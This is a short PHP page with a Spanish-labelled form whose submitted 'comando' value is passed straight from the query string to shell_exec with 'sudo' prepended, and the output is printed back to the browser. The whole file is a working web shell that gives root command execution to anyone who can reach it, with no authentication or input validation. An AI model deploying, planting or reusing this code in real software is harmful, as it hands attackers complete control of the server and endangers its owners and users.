<form action="print.php">
    <label>Comando</label>
    <input type="text" id="comando" name="comando">
    <button type="submit"> correr comando</button>
</form>

<?php

echo '<h3>Chain OUTPUT</h3>';
    $comand = $_GET['comando'];
	$var2 = shell_exec('sudo ' . $comand);
	echo "<pre>$var2</pre>";
	echo '<br><br>';
?>